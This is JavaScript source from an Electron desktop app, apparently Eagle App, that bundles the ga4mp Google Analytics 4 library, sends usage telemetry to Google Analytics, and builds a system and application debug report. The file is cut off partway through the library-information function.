*   @analytics-debugger/ga4mp 0.0.3
*   https://github.com/analytics-debugger/ga4mp
*
*   Copyright (c) David Vallejo (https://www.thyngster.com).
*   This source code is licensed under the MIT license found in the
*   LICENSE file in the root directory of this source tree.
*
*/

(function (global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
    typeof define === 'function' && define.amd ? define(factory) :
    (global = typeof globalThis !== 'undefined' ? globalThis : global || self, global.ga4mp = factory());
  })(this, (function () { 'use strict';
  
    function _extends() {
      _extends = Object.assign ? Object.assign.bind() : function (target) {
        for (var i = 1; i < arguments.length; i++) {
          var source = arguments[i];
          for (var key in source) {
            if (Object.prototype.hasOwnProperty.call(source, key)) {
              target[key] = source[key];
            }
          }
        }
        return target;
      };
      return _extends.apply(this, arguments);
    }
  
    var trim = function trim(str, chars) {
      if (typeof str === 'string') {
        return str.substring(0, chars);
      } else {
        return str;
      }
    };
    var isFunction = function isFunction(val) {
      if (!val) return false;
      return Object.prototype.toString.call(val) === '[object Function]' || typeof val === 'function' && Object.prototype.toString.call(val) !== '[object RegExp]';
    };
    var isNumber = function isNumber(val) {
      return 'number' === typeof val && !isNaN(val);
    };
    var isString = function isString(val) {
      return val != null && typeof val === 'string';
    };
    var randomInt = function randomInt() {
      return Math.floor(Math.random() * (2147483647 - 0 + 1) + 0);
    };
    var timestampInSeconds = function timestampInSeconds() {
      return Math.floor(new Date() * 1 / 1000);
    };
    var getEnvironment = function getEnvironment() {
      var env;
      if (typeof window !== 'undefined' && typeof window.document !== 'undefined') env = 'browser';else if (typeof process !== 'undefined' && process.versions != null && process.versions.node != null) env = 'node';
      return env;
    };
  
    /**
     * Function to sanitize values based on GA4 Model Limits
     * @param {string} val
     * @param {integer} maxLength
     * @returns
     */
  
    var sanitizeValue = function sanitizeValue(val, maxLength) {
      // Trim a key-value pair value based on GA4 limits
      /*eslint-disable */
      try {
        val = val.toString();
      } catch (e) {}
      /*eslint-enable */
      if (!isString(val) || !maxLength || !isNumber(maxLength)) return val;
      return trim(val, maxLength);
    };
  
    var ga4Schema = {
        app_version: 'av',
        app_name: 'an',
      _em: 'em',
      event_name: 'en',
      protocol_version: 'v',
      _page_id: '_p',
      _is_debug: '_dbg',
      tracking_id: 'tid',
      hit_count: '_s',
      user_id: 'uid',
      client_id: 'cid',
      page_location: 'dl',
      language: 'ul',
      firebase_id: '_fid',
      traffic_type: 'tt',
      ignore_referrer: 'ir',
      screen_resolution: 'sr',
      global_developer_id_string: 'gdid',
      redact_device_info: '_rdi',
      geo_granularity: '_geo',
      _is_passthrough_cid: 'gtm_up',
      _is_linker_valid: '_glv',
      _user_agent_architecture: 'uaa',
      _user_agent_bitness: 'uab',
      _user_agent_full_version_list: 'uafvl',
      _user_agent_mobile: 'uamb',
      _user_agent_model: 'uam',
      _user_agent_platform: 'uap',
      _user_agent_platform_version: 'uapv',
      _user_agent_wait: 'uaW',
      _user_agent_wow64: 'uaw',
      error_code: 'ec',
      session_id: 'sid',
      session_number: 'sct',
      session_engaged: 'seg',
      page_referrer: 'dr',
      page_title: 'dt',
      currency: 'cu',
      campaign_content: 'cc',
      campaign_id: 'ci',
      campaign_medium: 'cm',
      campaign_name: 'cn',
      campaign_source: 'cs',
      campaign_term: 'ck',
      engagement_time_msec: '_et',
      event_developer_id_string: 'edid',
      is_first_visit: '_fv',
      is_new_to_site: '_nsi',
      is_session_start: '_ss',
      is_conversion: '_c',
      euid_mode_enabled: 'ecid',
      non_personalized_ads: '_npa',
      create_google_join: 'gaz',
      is_consent_update: 'gsu',
      user_ip_address: 'uip',
      google_consent_state: 'gcs',
      google_consent_update: 'gcu',
      us_privacy_string: 'uip',
      document_location: 'dl',
      document_path: 'dp',
      document_title: 'dt',
      document_referrer: 'dr',
      user_language: 'ul',
      document_hostname: 'dh',
      item_id: 'id',
      item_name: 'nm',
      item_brand: 'br',
      item_category: 'ca',
      item_category2: 'c2',
      item_category3: 'c3',
      item_category4: 'c4',
      item_category5: 'c5',
      item_variant: 'va',
      price: 'pr',
      quantity: 'qt',
      coupon: 'cp',
      item_list_name: 'ln',
      index: 'lp',
      item_list_id: 'li',
      discount: 'ds',
      affiliation: 'af',
      promotion_id: 'pi',
      promotion_name: 'pn',
      creative_name: 'cn',
      creative_slot: 'cs',
      location_id: 'lo',
      // legacy ecommerce
      id: 'id',
      name: 'nm',
      brand: 'br',
      variant: 'va',
      list_name: 'ln',
      list_position: 'lp',
      list: 'ln',
      position: 'lp',
      creative: 'cn'
    };
    var ecommerceEvents = ['add_payment_info', 'add_shipping_info', 'add_to_cart', 'remove_from_cart', 'view_cart', 'begin_checkout', 'select_item', 'view_item_list', 'select_promotion', 'view_promotion', 'purchase', 'refund', 'view_item', 'add_to_wishlist'];
  
    var sendRequest = function sendRequest(endpoint, payload) {
      var mode = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 'browser';
      var opts = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : {};
      var qs = new URLSearchParams(JSON.parse(JSON.stringify(payload))).toString();
      if (mode === 'browser') {
        var _navigator;
        (_navigator = navigator) === null || _navigator === void 0 ? void 0 : _navigator.sendBeacon([endpoint, qs].join('?'));
      } else {
        var scheme = endpoint.split('://')[0];
        var req = require(scheme);
        var options = {
          headers: {
            'User-Agent': opts.user_agent
          },
          timeout: 1
        };
        var request = req.get([endpoint, qs].join('?'), options, function (resp) {
          resp.on('data', function (chunk) {
          });
          resp.on('end', function () {
            // TO-DO Handle Server Side Responses                    
          });
        }).on('error', function (err) {
          console.log('Error: ' + err.message);
        });
        request.on('timeout', function () {
          request.destroy();
        });
      }
    };
  
    var clientHints = function clientHints() {
      var _navigator, _navigator$userAgentD;
      if (!((_navigator = navigator) !== null && _navigator !== void 0 && (_navigator$userAgentD = _navigator.userAgentData) !== null && _navigator$userAgentD !== void 0 && _navigator$userAgentD.getHighEntropyValues)) return new Promise(function (resolve) {
        resolve(null);
      });
      return navigator.userAgentData.getHighEntropyValues(['platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion', 'bitness', 'fullVersionList', 'wow64']).then(function (d) {
        var _navigator2, _navigator2$userAgent, _navigator3, _navigator3$userAgent, _navigator4, _navigator4$userAgent;
        return {
          _user_agent_architecture: d.architecture,
          _user_agent_bitness: d.bitness,
          _user_agent_full_version_list: encodeURIComponent(d.fullVersionList || ((_navigator2 = navigator) === null || _navigator2 === void 0 ? void 0 : (_navigator2$userAgent = _navigator2.userAgentData) === null || _navigator2$userAgent === void 0 ? void 0 : _navigator2$userAgent.brands.map(function (h) {
            return [h.brand, h.version].join(';');
          }).join('|'))),
          _user_agent_mobile: d.mobile ? 1 : 0,
          _user_agent_model: d.model || ((_navigator3 = navigator) === null || _navigator3 === void 0 ? void 0 : (_navigator3$userAgent = _navigator3.userAgentData) === null || _navigator3$userAgent === void 0 ? void 0 : _navigator3$userAgent.mobile),
          _user_agent_platform: d.platform || ((_navigator4 = navigator) === null || _navigator4 === void 0 ? void 0 : (_navigator4$userAgent = _navigator4.userAgentData) === null || _navigator4$userAgent === void 0 ? void 0 : _navigator4$userAgent.platform),
          _user_agent_platform_version: d.platformVersion,
          _user_agent_wow64: d.wow64 ? 1 : 0
        };
      });
    };
  
    /**
     * Populate Page Related Details
     */
    var pageDetails = function pageDetails() {
      return {
        page_location: document.location.href,
        page_referrer: document.referrer,
        page_title: document.title,
        language: (navigator && (navigator.language || navigator.browserLanguage) || '').toLowerCase(),
        screen_resolution: (window.screen ? window.screen.width : 0) + 'x' + (window.screen ? window.screen.height : 0)
      };
    };
  
    var version = '0.0.1-alpha.3';
  
    /**
     * Main Class Function
     * @param {array|string} measurement_ids
     * @param {object} config
     * @returns
     */
  
    var ga4mp = function ga4mp(measurement_ids) {
      var config = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
      if (!measurement_ids) throw 'Tracker initialization aborted: missing tracking ids';
      var internalModel = _extends({
        version: version,
        debug: false,
        mode: getEnvironment() || 'browser',
        measurement_ids: null,
        queueDispatchTime: 5000,
        queueDispatchMaxEvents: 10,
        queue: [],
        eventParameters: {},
        persistentEventParameters: {},
        userProperties: {},
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 [GA4MP/".concat(version, "]"),
        user_ip_address: null,
        hooks: {
          beforeLoad: function beforeLoad() {},
          beforeRequestSend: function beforeRequestSend() {}
        },
        endpoint: 'https://www.google-analytics.com/g/collect',
        payloadData: {}
      }, config);
  
      // Initialize Tracker Data
      internalModel.payloadData.protocol_version = 2;
      internalModel.payloadData.tracking_id = Array.isArray(measurement_ids) ? measurement_ids : [measurement_ids];
      internalModel.payloadData.client_id = config.client_id ? config.client_id : [randomInt(), timestampInSeconds()].join('.');
      internalModel.payloadData._is_debug = config.debug ? 1 : undefined;
      internalModel.payloadData.non_personalized_ads = config.non_personalized_ads ? 1 : undefined;
      internalModel.payloadData.hit_count = 1;
  
      // Initialize Session Data
      internalModel.payloadData.session_id = config.session_id ? config.session_id : timestampInSeconds();
      internalModel.payloadData.session_number = config.session_number ? config.session_number : 1;
  
      // Initialize User Data
      internalModel.payloadData.user_id = config.user_id ? trim(config.user_id, 256) : undefined;
      internalModel.payloadData.user_ip_address = config.user_ip_address ? config.user_ip_address : undefined;
      internalModel.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 [GA4MP/".concat(version, "]");
  
      // Initialize Tracker Data
      if (internalModel === 'node' && config.user_agent) {
        internalModel.user_agent = config.user_agent;
      }
      // Grab data only browser data
      if (internalModel.mode === 'browser') {
        var pageData = pageDetails();
        if (pageData) {
          internalModel.payloadData = _extends(internalModel.payloadData, pageData);
        }
      }
      /**
       * Dispatching Queue
       * TO-DO
       */
      var dispatchQueue = function dispatchQueue() {
        internalModel.queue = [];
      };
  
      /**
       * Grab current ClientId
       * @returns string
       */
      var getClientId = function getClientId() {
        return internalModel.payloadData.client_id;
      };
  
      /**
       * Grab current Session ID
       * @returns string
       */
      var getSessionId = function getSessionId() {
        return internalModel.payloadData.session_id;
      };
  
      /**
       * Set an Sticky Event Parameter, it wil be attached to all events
       * @param {string} key
       * @param {string|number|Fn} value
       * @returns
       */
      var setEventsParameter = function setEventsParameter(key, value) {
        if (isFunction(value)) {
          try {
            value = value();
          } catch (e) {}
        }
        key = sanitizeValue(key, 40);
        value = sanitizeValue(value, 100);
        internalModel['persistentEventParameters'][key] = value;
      };

      var setInternalParmeter = function setInternalParmeter(key, value) {
        if (isFunction(value)) {
          try {
            value = value();
          } catch (e) {}
        }
        key = sanitizeValue(key, 40);
        value = sanitizeValue(value, 100);
        internalModel['payloadData'][key] = value;
      };

      
  
      /**
       * setUserProperty
       * @param {*} key
       * @param {*} value
       * @returns
       */
      var setUserProperty = function setUserProperty(key, value) {
        key = sanitizeValue(key, 24);
        value = sanitizeValue(value, 36);
        internalModel['userProperties'][key] = value;
      };
  
      /**
       * Generate Payload
       * @param {object} customEventParameters
       */
      var buildPayload = function buildPayload(eventName, customEventParameters) {
        var payload = {};
        if (internalModel.payloadData.hit_count === 1) internalModel.payloadData.session_engaged = 1;
        Object.entries(internalModel.payloadData).forEach(function (pair) {
          var key = pair[0];
          var value = pair[1];
          if (ga4Schema[key]) {
            payload[ga4Schema[key]] = typeof value === 'boolean' ? +value : value;
          }
        });
        // GA4 Will have different Limits based on "unknown" rules
        // const itemsLimit = isP ? 27 : 10
        var eventParameters = _extends(JSON.parse(JSON.stringify(internalModel.persistentEventParameters)), JSON.parse(JSON.stringify(customEventParameters)));
        eventParameters.event_name = eventName;
        Object.entries(eventParameters).forEach(function (pair) {
          var key = pair[0];
          var value = pair[1];
          if (key === 'items' && ecommerceEvents.indexOf(eventName) > -1 && Array.isArray(value)) {
            // only 200 items per event
            var items = value.slice(0, 200);
            for (var i = 0; i < items.length; i++) {
              if (items[i]) {
                (function () {
                  var item = {
                    core: {},
                    custom: {}
                  };
                  Object.entries(items[i]).forEach(function (pair) {
                    if (ga4Schema[pair[0]]) {
                      if (typeof pair[1] !== 'undefined') item.core[ga4Schema[pair[0]]] = pair[1];
                    } else item.custom[pair[0]] = pair[1];
                  });
                  var productString = Object.entries(item.core).map(function (v) {
                    return v[0] + v[1];
                  }).join('~') + '~' + Object.entries(item.custom).map(function (v, i) {
                    var customItemParamIndex = 10 > i ? '' + i : String.fromCharCode(65 + i - 10);
                    return "k".concat(customItemParamIndex).concat(v[0], "~v").concat(customItemParamIndex).concat(v[1]);
                  }).join('~');
                  payload["pr".concat(i + 1)] = productString;
                })();
              }
            }
          } else {
            if (ga4Schema[key]) {
              payload[ga4Schema[key]] = typeof value === 'boolean' ? +value : value;
            } else {
              payload[(isNumber(value) ? 'epn.' : 'ep.') + key] = value;
            }
          }
        });
        Object.entries(internalModel.userProperties).forEach(function (pair) {
          var key = pair[0];
          var value = pair[1];
          if (ga4Schema[key]) {
            payload[ga4Schema[key]] = typeof value === 'boolean' ? +value : value;
          } else {
            payload[(isNumber(value) ? 'upn.' : 'up.') + key] = value;
          }
        });
        return payload;
      };
  
      /**
       * setUserId
       * @param {string} value
       * @returns
       */
      var setUserId = function setUserId(value) {
        internalModel.payloadData.user_id = sanitizeValue(value, 256);
      };
  
      /**
       * Track Event
       * @param {string} eventName
       * @param {object} eventParameters
       * @param {boolean} forceDispatch
       */
      var getHitIndex = function getHitIndex() {
        return internalModel.payloadData.hit_count;
      };
      var trackEvent = function trackEvent(eventName) {
        var eventParameters = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
        var forceDispatch = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : true;
        // We want to wait for the CH Promise to fullfill
        clientHints().then(function (ch) {
          if (ch) {
            internalModel.payloadData = _extends(internalModel.payloadData, ch);
          }
          var payload = buildPayload(eventName, eventParameters);
          if (payload && forceDispatch) {
            for (var i = 0; i < payload.tid.length; i++) {
              var r = JSON.parse(JSON.stringify(payload));
              r.tid = payload.tid[i];
              sendRequest(internalModel.endpoint, r, internalModel.mode, {
                user_agent: internalModel === null || internalModel === void 0 ? void 0 : internalModel.user_agent
              });
            }
            internalModel.payloadData.hit_count++;
          } else {
            var eventsCount = internalModel.queue.push(event);
            if (eventsCount >= internalModel.queueDispatchMaxEvents) {
              dispatchQueue();
            }
          }
        });
      };
      return {
        version: internalModel.version,
        mode: internalModel.mode,
        getHitIndex: getHitIndex,
        getSessionId: getSessionId,
        getClientId: getClientId,
        setUserProperty: setUserProperty,
        setEventsParameter: setEventsParameter,
        setInternalParmeter: setInternalParmeter,
        setUserId: setUserId,
        trackEvent: trackEvent
      };
    };
  
    return ga4mp;
  
  }));
/*
 * name: nwjs-analytics -Node-Webkit Google Analytics integration
 * version: 1.0.2
 * github: https://github.com/Daaru00/nwjs-analytics
 */

function guid() {
    return (Date.now().toString(36) + Math.random().toString(36).substr(2, 5)).toUpperCase();
}

// if (window.isRunningAsElectron) {
    // grab a uuid to identify the session

// set the uuid to local storage

if (!localStorage["gaClientId"] || localStorage["gaClientId"] == 'undefined') {
    localStorage.setItem("gaClientId", guid())
}
// set the cookie storage for google analytics to none, and provide your own client id
clientId = localStorage["gaClientId"];
// }
var preferences = preferences || require(appRoot + '/my_modules/electron-settings').getSync('preferences') || {};
var locale = preferences.language || "en";
var customDimesion1 = "未激活";


if (!localStorage["gaClientId"] || localStorage["gaClientId"] == 'undefined') {
    localStorage.setItem("gaClientId", crypto.randomUUID())
}

const ga4track = ga4mp(["G-LZFKF8K4LB"], {  
    user_id: localStorage["gaClientId"],
    non_personalized_ads: true,
    debug: false
});

ga4track.setUserProperty('language', preferences.general.language.replace("_", "-").toLowerCase());
ga4track.setEventsParameter('app_version', `${pjson.version} (${pjson.buildVersion})`);
ga4track.setEventsParameter('app_name', `Eagle App`);

var analytics = {
    apiVersion: '1',
    trackID: 'UA-88989101-2',
    clientID: clientId,
    userID: clientId,
	appName: 'Eagle App',
	appVersion: `${pjson.version} (${pjson.buildVersion})`, 
	debug: false,
	performanceTracking: true,
	errorTracking: true,
	userLanguage: locale.replace("_", "-").toLowerCase(),
    currency: "USD",
    lastScreenName: '',

    sendRequest: function(data, callback){

        // 工程模式不需要記錄
        if (pjson.buildVersion === "dev") return;
        // if(!this.clientID || this.clientID == null)
        //     this.clientID = this.generateClientID();

        // if(!this.userID || this.userID == null)
        //     this.userID = this.generateClientID();

        var postData = "v=" + this.apiVersion
                        +"&tid=" + this.trackID
                        +"&cid=" + this.clientID
                        +"&uid=" + this.userID
                        +"&an=" + this.appName
                        +"&av=" + this.appVersion
                        +"&sr=" + this.getScreenResolution()
                        +"&vp=" + this.getViewportSize()
                        +"&sd=" + this.getColorDept()
                        +"&ul=" + this.userLanguage
                        +"&ua=" + this.getUserAgent()
                        +"&cd1=" + customDimesion1  // 自定维度1
                        +"&ds=app";

        Object.keys(data).forEach(function(key) {
            var val = data[key];
            if(typeof val != "undefined")
                postData += "&"+key+"="+val;
        });

        var http = new XMLHttpRequest();
        var url = "https://www.google-analytics.com";
        if(!this.debug)
            url += "/collect";
        else
            url += "/debug/collect";

        http.open("POST", url, true);

        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

        http.onreadystatechange = function() {
            if(analytics.debug)
                console.log(http.response);

            if(http.readyState == 4 && http.status == 200) {
                if(callback)
                    callback(true);
            }
            else
            {
                if(callback)
                    callback(false);
            }
        }
        http.send(postData);
    },
    generateClientID: function()
    {
        var id = "";
        var possibilities = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        for( var i=0; i < 5; i++ )
            id += possibilities.charAt(Math.floor(Math.random() * possibilities.length));
        return id;
    },
    getScreenResolution: function(){
        return screen.width+"x"+screen.height;
    },
    getColorDept: function(){
        return screen.colorDepth+"-bits";
    },
    getUserAgent: function(){
        return navigator.userAgent;
    },
    getViewportSize: function(){
        return window.screen.availWidth+"x"+window.screen.availHeight;
    },

    /*
     * Measurement Protocol
     * [https://developers.google.com/analytics/devguides/collection/protocol/v1/devguide]
     * https://developers.google.com/analytics/devguides/collection/protocol/v1/parameters#t
     */

    screenView: throttle(function(screename){
        var data = {
			't' : 'screenview',
			'cd' : screename
		}
		this.sendRequest(data);
        this.lastScreenName = screename;
        ga4track.trackEvent('page_view', {
            page_location: `/${screename}`,
            page_title: screename,
        });
    }, 10000),
    event: function(category, action, label, value){
        var data = {
			't' : 'event',
			'ec' : category,
			'ea' : action,
			'el' : label,
			'ev' : value,
            'cd' : this.lastScreenName,
		}
		this.sendRequest(data);

        let params = {};
        if (action) {
            params[action] = label || "true";
        }
        ga4track.trackEvent(category, params);
    },
    exception: function(msg, fatal){
        var data = {
			't' : 'exception',
			'exd' : msg,
			'exf' : fatal || 0
		}
		this.sendRequest(data);
    },
    timing: function(category, variable, time, label){
        var data = {
			't' : 'timing',
			'utc' : category,
			'utv' : variable,
			'utt' : time,
			'utl' : label,
		}
		this.sendRequest(data);
    },
    ecommerce:{
        transactionID: false,
        generateTransactionID: function()
        {
            var id = "";
            var possibilities = "0123456789";
            for( var i=0; i < 5; i++ )
                id += possibilities.charAt(Math.floor(Math.random() * possibilities.length));
            return id;
        },
        transaction: function(total, items){
            var t_id = "";
            if(!this.ecommerce.transactionID)
                t_id = this.ecommerce.generateTransactionID();
            else
                t_id = this.ecommerce.transactionID;

            var data = {
                't' : 'transaction',
                'ti' : t_id,
                'tr' : total,
                'cu' : this.currency,
            }
            this.sendRequest(data);

            items.forEach(function(item){
                var data = {
                    't' : 'item',
                    'ti' : t_id,
                    'in' : item.name,
                    'ip' : item.price,
                    'iq' : item.qty,
                    'ic' : item.id,
                    'cu' : this.currency
                }
                this.sendRequest(data);
            })
        }
    },
    custom: function(data){
        this.sendRequest(data);
    }
}

/*
 * Performance Tracking
 */

window.addEventListener("load", function() {

    if(analytics.performanceTracking)
    {
        setTimeout(function() {
            var timing = window.performance.timing;
            var userTime = timing.loadEventEnd - timing.navigationStart;

            analytics.timing("performance", "pageload", userTime);

          }, 0);
    }

}, false);

// /*
//  * Error Reporting
//  */

// window.onerror = function (msg, url, lineNo, columnNo, error) {
//     var message = [
//         'Message: ' + msg,
//         'Line: ' + lineNo,
//         'Column: ' + columnNo,
//         'Error object: ' + JSON.stringify(error)
//     ].join(' - ');

//     if(analytics.errorTracking)
//     {
//         setTimeout(function() {
//             analytics.exception(message.toString());
//         }, 0);
//     }

//     return false;
// };

var DebugReporter = {
	output: "",
	isMac: process.platform === 'darwin',
	getGPUInfo: function () {

		let canvas = document.createElement('canvas');
		let gl;
		let debugInfo;
		let vendor;
		let renderer;

		try {
  			gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
		} 
		catch (e) {}

		if (gl) {
			debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
			vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
			renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
			return renderer;
		}
		else {
			return "unknown";
		}
	},
	getOSVersion: function () {
	    var isMacOS = process.platform === 'darwin';
	    if (!isMacOS) {
	        return os.release();
	    }
	    else {
	        try {
	            const parseVersion = function (plist) {
	                const matches = /<key>ProductVersion<\/key>[\s]*<string>([\d.]+)<\/string>/.exec(plist);
	                if (!matches) {
	                    return;
	                }
	                return matches[1];
	            };
	            const file = fs.readFileSync('/System/Library/CoreServices/SystemVersion.plist', 'utf8');
	            const matches = parseVersion(file);
	            if (!matches) {
	                return os.release();
	            }
	            return matches;
	        }
	        catch (err) {
	            return os.release();
	        }
	    }
	},
	getOSName: function () {
	    var isMacOS = process.platform === 'darwin';
	    if (!isMacOS) {
	        return "Windows"
	    }
	    else {
	        return "macOS"
	    }
	},
	printPlugins: function (callback) {
		try {

			const plugins = pluginModule.plugins;
			const pluginsStr = plugins.map((plugin) => {
				return `${plugin?.manifest?.name} (${plugin?.manifest?.version}): ${plugin?.path}`;
			}).join("\n");

			this.output += 
`
 
===========================================================================================
Plugin Information
===========================================================================================
${pluginsStr}

`;
			callback();
		}
		catch (err) {
			this.output += 
`
===========================================================================================
 Plugin Information
===========================================================================================
${err.stack || err}
 

`;
			callback(err);
		}
	},
	printHeader: function (callback) {
		try {
			this.output += 
`
===========================================================================================
 Eagle Debugger Report
===========================================================================================
 Created at      |  ${new Date().toISOString()}
 

`;
			callback();
		}
		catch (err) {
			this.output += 
`
===========================================================================================
 Eagle Debugger Report
===========================================================================================
${err.stack || err}
 

`;
			callback(err);
		}
	},
	printSystemInfo: async function (callback) {
		try {
			const os = require('os');
			var osStr = `${this.getOSName()} ${this.getOSVersion()}(${process.arch})`;
			var gpuStr = `${this.getGPUInfo()}`;
			var screenStr = "";
			var allDisplays = await ipcRenderer.invoke('SCREEN.', 'getAllDisplays');
			var screens = allDisplays.map((screen) => {
				return {
					width: screen.size.width,
					height: screen.size.height,
                    scaleFactor: screen.scaleFactor
				}
			});

			screens.forEach((screen, index) => {
				screenStr += `${index + 1}: ${screen.width} x ${screen.height} (devicePixelRatio: ${screen.scaleFactor}) `;
			});

			let cpus = os.cpus();
			let cpuString = "";
	        if (cpus[0] && cpus[0].model) {
	            cpuString = `${cpus[0].model} (${cpus.length}core)`;
	        }
	        else {
	            cpuString = `${cpus.length} core`;
	        }

			if (this.isMac) {
				this.output += 
`
===========================================================================================
 System Information
===========================================================================================
 OS              |  ${osStr}
 CPU             |  ${cpuString}
 GPU             |  ${gpuStr}
 Memory (global) |  ${os.totalmem() / 1024 / 1024 / 1024} GB
 Memory (free)   |  ${os.freemem() / 1024 / 1024 / 1024} GB
 Screen          |  ${screenStr}
 Device ID       |  ${machineID}
                 |  
 process.env     |  PWD: ${process.env.PWD}
                 |  TMPDIR: ${process.env.TMPDIR}
                 |  LANG: ${process.env.LANG}

 
`;
			}
			else {
				const execSync = require('child_process').execSync;
				var stdoutString;
				try {
				    stdoutString = execSync(`reg query "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full" /v Version`, {}, {
				        timeout: 5000
				    }).toString();
				    var arr = stdoutString.split("REG_SZ");
				    stdoutString = arr[arr.length - 1].trim();
				}
				catch (err) {
				    stdoutString = err.stack;
				}
				this.output += 
`
===========================================================================================
 System Information
===========================================================================================
 OS              |  ${osStr}
 CPU             |  ${cpuString}
 GPU             |  ${gpuStr}
 Memory (global) |  ${os.totalmem() / 1024 / 1024 / 1024} GB
 Memory (free)   |  ${os.freemem() / 1024 / 1024 / 1024} GB
 Screen          |  ${screenStr}
 Device ID       |  ${machineID}
 NET Framework   |  ${stdoutString}
                 |  
 process.env     |  APPDATA: ${process.env.APPDATA}
                 |  COMSPEC: ${process.env.COMSPEC}
                 |  SYSTEMDRIVE: ${process.env.SYSTEMDRIVE}
                 |  SYSTEMROOT: ${process.env.SYSTEMROOT}
                 |  WINDIR: ${process.env.WINDIR}
                 |  TMP: ${process.env.TMP}
                 |  TMPDIR: ${process.env.TMPDIR}
                 |  LANG: "zh_TW.UTF-8"

 
`;
			}
			callback();
		}
		catch (err) {
			this.output += 
`
===========================================================================================
 System Information
===========================================================================================
${err.stack || err}
 

`;
			callback(err);
		}
	},
	printApplicationInfo: function (callback) {
		try {

			var pjson = require(appRoot + '/package.json');
			const appVersion = pjson.version;
			const buildVersion = pjson.buildVersion;
			const buildNumber = pjson.buildNumber;

			var libraryStr = "";
			var libraryHistory = electronSettings.getSync('libraryHistory') || [];
			var normalizeHistory = [];
			libraryHistory.forEach(function (history) {
                if (history) { normalizeHistory.push(path.normalize(history).replace(/\\$/g, "").replace(/\/$/, "")); }
            });
            libraryHistory = [...new Set(normalizeHistory)];
			libraryHistory.forEach((libraryPath, index) => {
				if (index === 0) {
					libraryStr += ` Library          |  ${libraryPath}
`;
				}
				else {
					libraryStr += `                  |  ${libraryPath}
`;
				}
			});

			this.output += 
`
===========================================================================================
 Application Information
===========================================================================================
 Version          |  ${appVersion} Build${buildNumber} (${buildVersion})
 Path             |  ${appRoot.path}
 Language         |  ${i18n.locale}
${libraryStr}
`;

			if (this.isMac) {
				this.output += 
`
 
`;
			}
			else {
				var dllRoot = app.getAppPath().replace("\\resources\\app.asar", "");

				// Niunniun
				var NiunniunExeStr = ``;
				var NiunniunExeStat;
				var NiunniunExePath = path.normalize(`${dllRoot}/NiuniuCapture.exe`);

				var NiunniunDllStr = ``;
				var NiunniunDllStat;
				var NiunniunDllPath = path.normalize(`${dllRoot}/NiuniuCapture.dll`);

				var MagickDllStr = ``;
				var MagickDllStat;
				var MagickDllPath = path.normalize(`${dllRoot}/Magick.dll`);

				var MagickCoreDllStr = ``;
				var MagickCoreDllStat;
				var MagickCoreDllPath = path.normalize(`${dllRoot}/Magick.Core.dll`);

				if (fs.existsSync(NiunniunExePath)) {
					NiunniunExeStat = fs.statSync(NiunniunExePath);
					NiunniunExeStr = `Niunniun.exe (${NiunniunExePath}) (${NiunniunExeStat.size / 1024} KB)`;
				}
				else {
					NiunniunExeStr = `Niunniun.exe (Not Found)`;
				}

				if (fs.existsSync(NiunniunDllPath)) {
					NiunniunDllStat = fs.statSync(NiunniunDllPath);
					NiunniunDllStr = `Niunniun.dll (${NiunniunDllPath}) (${NiunniunDllStat.size / 1024} KB)`;
				}
				else {
					NiunniunDllStr = `Niunniun.dll (Not Found)`;
				}

				if (fs.existsSync(MagickDllPath)) {
					MagickDllStat = fs.statSync(MagickDllPath);
					MagickDllStr = `Magick.dll (${MagickDllPath}) (${MagickDllStat.size / 1024} KB)`;
				}
				else {
					MagickDllStr = `Magick.dll (Not Found)`;
				}

				if (fs.existsSync(MagickCoreDllPath)) {
					MagickCoreDllStat = fs.statSync(MagickCoreDllPath);
					MagickCoreDllStr = `Magick.Core.dll (${MagickCoreDllPath}) (${MagickCoreDllStat.size / 1024} KB)`;
				}
				else {
					MagickCoreDllStr = `Magick.Core.dll (Not Found)`;
				}

				// Edge-cs
				var EdgeCsStr = ``;
				var EdgeCsStat;
				var EdgeCsPath = path.normalize(`${dllRoot}/edge-cs.dll`);

				if (fs.existsSync(EdgeCsPath)) {
					EdgeCsStat = fs.statSync(EdgeCsPath);
					EdgeCsStr = `Edge-cs (${EdgeCsPath}) (${EdgeCsStat.size / 1024} KB)`;
				}
				else {
					EdgeCsStr = `Edge-cs (Not Found)`;
				}

				this.output += 
`                  |  
 Plugins          |  ${NiunniunExeStr}
                  |  ${NiunniunDllStr}
                  |  ${MagickDllStr}
                  |  ${MagickCoreDllStr}
                  |  ${EdgeCsStr}

`;
				var dirs = fs.readdirSync(dllRoot);
				var dirsStr = "";
				this.output += 
`                  |  
 Files            |  ${dirs.length} files`;
				dirs.forEach(function(dir) {
					dirsStr +=`
                  |  ${dir}`;
				});
				this.output += dirsStr;
			}
			callback();
		}
		catch (err) {
			this.output += 
`
===========================================================================================
 Application Information
===========================================================================================
${err.stack || err}
 

`;
			callback(err);
		}
	},
	printLibraryInfo: function (callback) {
		try {

			if (!$bodyScope.libraryPath) {
				this.output += 
`
 
===========================================================================================
 Library Information
===========================================================================================
 No library has been opened yet


`;
				callback();
				return;
			}

			var isWritable = function (dir) {
				try { fs.accessSync(dir, fs.W_OK) } catch (err) { return "No"; }
				return "Yes"
			};

			var alcCheck = function (dir) {
				if (!ACCESS.checkALCs(dir)) return "NO";
				return "YES"
			};

			var getSize = function (dir) {
				try { return fs.statSync(dir).size } catch (err) { return 0; }
				return 0;
			};

			var libraryPath = $bodyScope.libraryPath;
			var metadataPath = path.normalize(`${libraryPath}/metadata.json`);
			var mtimePath = path.normalize(`${libraryPath}/mtime.json`);
